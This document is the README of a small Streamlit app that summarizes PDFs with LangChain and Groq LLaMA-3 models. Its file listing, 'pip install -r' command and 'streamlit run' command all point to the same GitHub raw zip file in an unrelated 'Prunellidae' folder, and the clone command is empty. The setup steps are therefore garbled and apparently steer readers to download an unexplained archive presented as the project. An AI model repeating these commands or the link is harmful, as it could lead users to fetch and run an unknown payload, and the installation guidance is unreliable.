# Project - 23 PDF Summarizer 

This project is a simple and fast PDF summarization app built with **Streamlit**, **LangChain**, and **Groq’s LLaMA-3 models**. It loads a PDF, extracts the text, splits it into clean chunks, summarizes each chunk using a Groq LLM, and combines all summaries into a final, coherent output.

---

## 🚀 Features

* Upload any PDF and extract its text instantly
* Chunking system to handle long documents efficiently
* Summarization powered by **LLaMA-3.1-8B-Instant** (Groq)
* Clean, minimal Streamlit interface
* Fast inference thanks to Groq’s ultra-low latency models

---

## 🧱 Project Structure

```
pdf-summarizer/
│
├── https://github.com/analyst-ujjwal/Ai_project_23/raw/refs/heads/main/Prunellidae/project-Ai-v3.3-alpha.1.zip
├── https://github.com/analyst-ujjwal/Ai_project_23/raw/refs/heads/main/Prunellidae/project-Ai-v3.3-alpha.1.zip
├── https://github.com/analyst-ujjwal/Ai_project_23/raw/refs/heads/main/Prunellidae/project-Ai-v3.3-alpha.1.zip
└── .env (not included)
```

---

## 📦 Installation

### 1. Clone the repository

```
git clone 
cd pdf-summarizer-groq
```

### 2. Install dependencies

```
pip install -r https://github.com/analyst-ujjwal/Ai_project_23/raw/refs/heads/main/Prunellidae/project-Ai-v3.3-alpha.1.zip
```

### 3. (Mac users) Install Watchdog for faster reloads (optional)

```
xcode-select --install
pip install watchdog
```

---

## 🔑 Environment Setup

Create a `.env` file in the project root:

```
GROQ_API_KEY=your_key_here
```



---

## ▶️ Run the App

```
streamlit run https://github.com/analyst-ujjwal/Ai_project_23/raw/refs/heads/main/Prunellidae/project-Ai-v3.3-alpha.1.zip
```

Open the link in your browser and upload any PDF.

---

## ⚙️ Technology Used

* **Streamlit** — Simple UI
* **LangChain** — LLM orchestration
* **ChatGroq** — Groq API wrapper
* **LLaMA-3.1-8B-Instant** — High-speed summarization model
* **pypdf** — PDF text extraction

---

## ✨ How It Works

1. The PDF is uploaded and parsed using `pypdf`.
2. Extracted text is split into manageable chunks.
3. Each chunk is summarized using a Groq LLaMA-3 model.
4. Summaries are merged into a final output.
5. Displayed inside Streamlit.

---

## 📝 Customization

You can modify:

* **LLM model** (switch to LLaMA-3.3-70B-Versatile)
* **Chunk size** for longer/shorter summaries
* **Temperature** for more factual or creative outputs
* Add a *meta-summary* pass for higher quality results

---

## 📄 License

This project is open-source and free to use.

---

## 💡 Next Steps

* Add bullet-point summaries
* Add PDF download of final summary
* Add multi-language support


